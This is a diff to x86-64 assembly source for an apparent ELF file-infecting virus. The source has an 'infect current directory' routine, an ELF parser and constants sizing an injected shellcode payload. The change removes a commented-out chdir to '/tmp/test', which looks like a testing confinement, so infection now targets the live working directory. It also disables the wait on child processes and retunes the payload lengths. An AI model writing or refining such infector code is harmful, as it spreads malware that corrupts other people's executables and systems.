@@ -25,14 +25,7 @@ _start:
 	mov rax, 80
 	syscall; chdir("/")
 	add rsp, 8
-;	mov rax, 80
-;	xor rdi, rdi
-;	mov rdi, 0x002f; "t\0"
-;	push rdi
-;	lea rdi, [rsp]
-;	syscall; chdir("/tmp/test");
-;	add rsp, 8
-	;infect current directory
+	;infect currnt directory
 	push 0x0000002e; our target directory here "."
 	lea rdi, [rsp]
 	call list_files
@@ -559,12 +552,12 @@ handle_dir:
 	hd_parent:
 
 	;wait for child
-	mov rdi, rax; pid
-	mov rax, 61; sys_wait4
-	mov rsi, 0
-	mov rdx, 0
-	mov r10, 0
-	syscall; wait4(pid, NULL, 0, NULL); we wait for child to finish
+;	mov rdi, rax; pid
+;	mov rax, 61; sys_wait4
+;	mov rsi, 0
+;	mov rdx, 0
+;	mov r10, 0
+;	syscall; wait4(pid, NULL, 0, NULL); we wait for child to finish
 	;pop and return
 	pop r8
 	pop rcx
@@ -995,9 +988,9 @@ push rdx
 	pop rcx
 retn
 
-%define SHELLCODE_LEN 6519 ; 44 + 5 (jmp) + 12 (exit) + signature (39)
-%define SHELLCODE_JMP_INDEX 6468; 44 + 5 (jmp)
-%define PURE_SHELLCODE_LEN 6463 
+%define SHELLCODE_LEN 6493 ; 44 + 5 (jmp) + 12 (exit) + signature (39)
+%define SHELLCODE_JMP_INDEX 6442; 44 + 5 (jmp)
+%define PURE_SHELLCODE_LEN 6437 
 ; void parse64elf(void *file, int wfd, unsigned long fsize)
 parse64elf:
 	sub rsp, 8
